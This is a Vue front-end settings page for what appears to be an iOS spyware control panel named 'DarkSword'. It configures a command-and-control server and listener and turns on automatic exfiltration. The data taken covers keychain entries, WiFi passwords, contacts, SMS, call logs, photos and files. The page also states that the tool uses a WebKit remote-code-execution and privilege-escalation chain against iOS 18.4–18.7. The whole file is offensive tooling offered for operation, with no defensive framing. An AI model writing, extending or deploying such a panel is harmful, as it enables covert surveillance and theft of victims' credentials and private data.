<template>
  <div class="system-settings">
    <el-card>
      <el-tabs v-model="activeTab">
        <el-tab-pane label="C2服务器配置" name="c2">
          <el-form :model="c2Settings" label-width="150px">
            <el-form-item label="C2服务器地址">
              <el-input v-model="c2Settings.c2_host" placeholder="http://c2.example.com:8080" />
            </el-form-item>
            <el-form-item label="监听地址">
              <el-input v-model="c2Settings.listen_host" placeholder="0.0.0.0" />
            </el-form-item>
            <el-form-item label="监听端口">
              <el-input-number v-model="c2Settings.listen_port" :min="1" :max="65535" />
            </el-form-item>
            <el-form-item label="重定向URL">
              <el-input v-model="c2Settings.redirect_url" placeholder="https://www.example.com" />
            </el-form-item>
            <el-form-item>
              <el-button type="primary" @click="saveC2Settings">保存配置</el-button>
            </el-form-item>
          </el-form>
        </el-tab-pane>
        
        <el-tab-pane label="漏洞配置" name="exploit">
          <el-form :model="exploitSettings" label-width="150px">
            <el-form-item label="自动执行数据窃取">
              <el-switch v-model="exploitSettings.auto_exfil" />
            </el-form-item>
            <el-form-item label="窃取数据类别">
              <el-select v-model="exploitSettings.exfil_categories" multiple style="width: 100%;">
                <el-option label="Keychain" value="keychain" />
                <el-option label="WiFi密码" value="wifi" />
                <el-option label="通讯录" value="contacts" />
                <el-option label="短信" value="sms" />
                <el-option label="通话记录" value="calls" />
                <el-option label="照片" value="photos" />
                <el-option label="文件" value="files" />
              </el-select>
            </el-form-item>
            <el-form-item label="命令轮询间隔(秒)">
              <el-input-number v-model="exploitSettings.poll_interval" :min="5" :max="300" />
            </el-form-item>
            <el-form-item>
              <el-button type="primary" @click="saveExploitSettings">保存配置</el-button>
            </el-form-item>
          </el-form>
        </el-tab-pane>
        
        <el-tab-pane label="系统信息" name="info">
          <el-descriptions :column="2" border>
            <el-descriptions-item label="系统版本">DarkSword 1.0</el-descriptions-item>
            <el-descriptions-item label="数据库">SQLite</el-descriptions-item>
            <el-descriptions-item label="后端框架">FastAPI</el-descriptions-item>
            <el-descriptions-item label="前端框架">Vue 3 + Element Plus</el-descriptions-item>
            <el-descriptions-item label="漏洞类型">WebKit RCE + PE</el-descriptions-item>
            <el-descriptions-item label="支持iOS版本">18.4 - 18.7</el-descriptions-item>
          </el-descriptions>
        </el-tab-pane>
      </el-tabs>
    </el-card>
  </div>
</template>

<script setup>
import { ref, reactive } from 'vue'
import axios from '../utils/axios'

const activeTab = ref('c2')

const c2Settings = reactive({
  c2_host: '',
  listen_host: '0.0.0.0',
  listen_port: 8080,
  redirect_url: ''
})

const exploitSettings = reactive({
  auto_exfil: true,
  exfil_categories: ['keychain', 'wifi', 'contacts'],
  poll_interval: 30
})

async function loadSettings() {
  try {
    const response = await axios.get('/api/settings')
    Object.assign(c2Settings, response.data.c2 || {})
    Object.assign(exploitSettings, response.data.exploit || {})
  } catch (error) {
    console.error('加载配置失败:', error)
  }
}

async function saveC2Settings() {
  try {
    await axios.put('/api/settings/c2', c2Settings)
    alert('配置已保存')
  } catch (error) {
    console.error('保存失败:', error)
  }
}

async function saveExploitSettings() {
  try {
    await axios.put('/api/settings/exploit', exploitSettings)
    alert('配置已保存')
  } catch (error) {
    console.error('保存失败:', error)
  }
}

loadSettings()
</script>
